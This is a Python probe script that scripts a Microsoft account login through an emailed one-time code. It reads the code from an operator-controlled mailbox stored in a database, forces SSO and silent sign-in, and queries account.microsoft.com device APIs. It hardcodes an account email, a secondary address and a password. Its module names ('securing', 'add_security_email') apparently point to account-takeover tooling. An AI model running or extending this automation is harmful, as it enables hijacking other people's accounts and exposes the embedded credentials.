#!/usr/bin/env python3
"""Probe finishing AMC session for devices API after OTP login."""
from __future__ import annotations

import asyncio
import re
import sys
from pathlib import Path
from urllib.parse import urljoin

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from database.database import DBConnection
from securing.auth.get_msaauth import get_msaauth
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host, _extract_sso_redirect
from securing.auth.send_auth import send_auth
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.ogi.amc_headers import amc_api_headers
from securing.utils.proxy import close_session

PRIMARY = "sunnya4085ef10ecb@outlook.com"
SEC = "3d53d15d899345f7@ilovevbucks.site"
PWD = "ApS96aYMYTDcxj"


async def dump_devices(session, label: str) -> None:
    r = await session.get(
        "https://account.microsoft.com/profile?lang=en-US", follow_redirects=True
    )
    tok_m = re.search(
        r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text or ""
    )
    tok = tok_m.group(1) if tok_m else None
    h = amc_api_headers(
        session, tok, qos_root="GLOBAL.HOME.DEVICES.GETDEVICESSUMMARYINFO"
    )
    d = await session.get(
        "https://account.microsoft.com/home/api/devices/devices-summary",
        headers=h,
        follow_redirects=True,
    )
    print(f"[{label}] devices status={d.status_code} body={(d.text or '')[:200]}")
    print(
        f"  AMCSecAuth={has_cookie(session,'AMCSecAuth')} "
        f"JWT={has_cookie(session,'AMCSecAuthJWT')} "
        f"WLSSC={has_cookie(session,'WLSSC')} profile_url={r.url}"
    )


async def main() -> None:
    with DBConnection() as db:
        try:
            db.add_security_email(SEC, PWD)
        except Exception:
            pass
        db.cursor.execute(
            "UPDATE received_emails SET consumed=0 WHERE lower(to_address)=? AND consumed=1 "
            "AND id=(SELECT MAX(id) FROM received_emails WHERE lower(to_address)=?)",
            (SEC.lower(), SEC.lower()),
        )

    s = get_session()
    try:
        info = await send_auth(s, PRIMARY, SEC)
        proofs = (
            ((info.get("response") or {}).get("Credentials") or {}).get(
                "OtcLoginEligibleProofs"
            )
            or []
        )
        print("waiting OTP…")
        code = await get_email_code(SEC, timeout=150)
        print("OTP", code)
        if not code:
            return
        live = await livedata(s)
        msa = await get_msaauth(
            s,
            PRIMARY,
            proofs[0]["data"],
            {"urlPost": live["urlPost"], "ppft": info.get("ppft") or live["ppft"]},
            code,
        )
        if isinstance(msa, str):
            h = await handle_redirects(s, msa)
            msa = h if isinstance(h, dict) else get_data(msa)

        # Capture polish HTML before polish_host returns
        polish_html = await polish_host(s, msa if isinstance(msa, dict) else {"_cookies_only": True})
        await dump_devices(s, "after polish")

        sso = _extract_sso_redirect(polish_html or "")
        print("sso from polish html", bool(sso), (sso or "")[:100])
        if sso:
            auth = await s.get(sso, follow_redirects=True, timeout=25.0)
            print("sso get", auth.url, "len", len(auth.text or ""))
            action_m = re.search(r'action="([^"]+)"', auth.text or "")
            pprid_m = re.search(r'name="pprid"[^>]*value="([^"]+)"', auth.text or "")
            nap_m = re.search(r'name="NAP"[^>]*value="([^"]+)"', auth.text or "")
            anon_m = re.search(r'name="ANON"[^>]*value="([^"]+)"', auth.text or "")
            t_m = re.search(r'name="t"[^>]*value="([^"]+)"', auth.text or "")
            print(
                "form fields",
                bool(action_m),
                bool(pprid_m),
                bool(nap_m),
                bool(anon_m),
                bool(t_m),
            )
            if action_m and pprid_m and nap_m and anon_m and t_m:
                await s.post(
                    action_m.group(1),
                    data={
                        "pprid": pprid_m.group(1),
                        "NAP": nap_m.group(1),
                        "ANON": anon_m.group(1),
                        "t": t_m.group(1),
                    },
                    follow_redirects=True,
                    timeout=25.0,
                )
                print("posted SSO form, AMCSecAuth=", has_cookie(s, "AMCSecAuth"))
            await dump_devices(s, "after forced SSO")

        # Try home → silent signin
        r = await s.get("https://account.microsoft.com/", follow_redirects=False)
        loc = r.headers.get("location")
        print("home", r.status_code, (loc or "")[:120])
        if loc:
            if not loc.startswith("http"):
                loc = urljoin(str(r.url), loc)
            r2 = await s.get(loc, follow_redirects=True)
            tm = re.search(r'name="t"[^>]*value="([^"]+)"', r2.text or "")
            print("t on hop", bool(tm), "url", r2.url)
            if tm:
                await s.post(
                    "https://account.microsoft.com/auth/complete-silent-signin"
                    "?ru=https://account.microsoft.com/"
                    "auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F"
                    "&wa=wsignin1.0&refd=login.live.com&wa=wsignin1.0",
                    data={"t": tm.group(1)},
                    headers={"X-Requested-With": "XMLHttpRequest"},
                    follow_redirects=True,
                )
                print("AMCSecAuth after nested silent", has_cookie(s, "AMCSecAuth"))
                await dump_devices(s, "after nested silent")

        # Try alternate devices endpoints
        for url in (
            "https://account.microsoft.com/devices/api/app-device",
            "https://account.microsoft.com/home/api/devices/banner-devices",
            "https://account.microsoft.com/devices/api/devices",
        ):
            tok_m = re.search(
                r'name="__RequestVerificationToken"[^>]*value="([^"]+)"',
                (await s.get("https://account.microsoft.com/profile?lang=en-US", follow_redirects=True)).text or "",
            )
            tok = tok_m.group(1) if tok_m else None
            h = amc_api_headers(s, tok, qos_root="GLOBAL.HOME.DEVICES.GETDEVICESSUMMARYINFO")
            resp = await s.get(url, headers=h, follow_redirects=True)
            print(f"ALT {url.split('/')[-1]} status={resp.status_code} {(resp.text or '')[:120]}")

    finally:
        await close_session(s)


if __name__ == "__main__":
    asyncio.run(main())
